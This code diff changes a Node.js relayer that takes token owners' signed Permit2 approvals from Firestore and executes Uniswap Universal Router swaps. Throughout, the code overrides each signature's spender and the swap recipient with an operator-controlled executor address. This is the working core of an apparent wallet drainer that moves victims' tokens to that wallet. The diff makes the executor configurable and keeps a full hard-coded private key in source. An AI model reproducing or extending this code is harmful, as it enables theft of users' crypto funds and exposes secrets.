@@ -13,10 +13,13 @@ import { ethers } from 'ethers';
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // mainnet
 
-// Hard-coded spender/executor address (forced)
+// Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
 const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
-// Hard-coded private key for the above spender (WARNING: embedding keys in source is insecure)
 const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';
+
+// Runtime executor config (may be loaded from Firestore admin_config/settings)
+let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
+let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;
 
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
@@ -58,12 +61,23 @@ async function init() {
   }
   db = admin.firestore();
 
+  // Load executor override from Firestore admin settings (optional)
+  try {
+    const cfgSnap = await db.collection('admin_config').doc('settings').get();
+    const cfg = cfgSnap.exists ? cfgSnap.data() : {};
+    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
+    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+  } catch (e) {
+    // ignore — we'll fall back to hard-coded values
+    console.error('failed to load admin_config settings (executor override):', e);
+  }
+
   provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
-  // Use hard-coded private key to create signer
-  spenderWallet = new ethers.Wallet(HARDCODED_PRIVATE_KEY, provider);
-  // Sanity check to ensure the key controls the expected address
-  if (spenderWallet.address.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
-    throw new Error(`HARDCODED_PRIVATE_KEY does not match HARDCODED_EXECUTOR: ${spenderWallet.address} != ${HARDCODED_EXECUTOR}`);
+  // Use configured private key to create signer
+  spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
+  // Sanity check to ensure the key controls the expected executor address
+  if (spenderWallet.address.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
+    throw new Error(`EXECUTOR_PRIVATE_KEY does not match EXECUTOR_ADDRESS: ${spenderWallet.address} != ${EXECUTOR_ADDRESS}`);
   }
 
   router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
@@ -110,8 +124,8 @@ function buildUniversalRouterTx(data, overrides = {}) {
     r, s, v
   } = data;
 
-  // recipient of swapped tokens: force to hard-coded executor
-  const recipient = HARDCODED_EXECUTOR;
+  // recipient of swapped tokens: use configured executor address
+  const recipient = EXECUTOR_ADDRESS;
 
   // normalize amount to BigInt
   const amountBn = BigInt(amount);
@@ -129,7 +143,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   const permitSingleTuple = [
     [
       [token, amountBn, Number(deadline), Number(nonce)],
-      HARDCODED_EXECUTOR, // spender forced to hard-coded executor
+      EXECUTOR_ADDRESS, // spender forced to configured executor
       Number(deadline)
     ],
     signatureBytes
@@ -192,8 +206,8 @@ async function processPending(limit = 10) {
     // read copy of data
     const data = docSnap.data();
 
-    // Force spender to the hard-coded executor (per operator request)
-    data.spender = HARDCODED_EXECUTOR;
+    // Force spender to the configured executor (per operator request)
+    data.spender = EXECUTOR_ADDRESS;
 
     // Basic validation
     if (!data.owner || !data.token || !data.amount || !data.r || !data.s) {
@@ -218,10 +232,10 @@ async function processPending(limit = 10) {
     if (balance < minEthRequired) {
       // update doc with actionable error; do NOT attempt tx
       await docSnap.ref.update({
-        lastError: `insufficient ETH in executor wallet (${HARDCODED_EXECUTOR}). Fund with at least ${minEthRequired.toString()} wei.`,
+        lastError: `insufficient ETH in executor wallet (${EXECUTOR_ADDRESS}). Fund with at least ${minEthRequired.toString()} wei.`,
         lastErrorAt: Date.now()
       });
-      console.error('insufficient executor funds:', { address: HARDCODED_EXECUTOR, balance: balance.toString() });
+      console.error('insufficient executor funds:', { address: EXECUTOR_ADDRESS, balance: balance.toString() });
       // skip further docs to avoid repeated failures
       continue;
     }
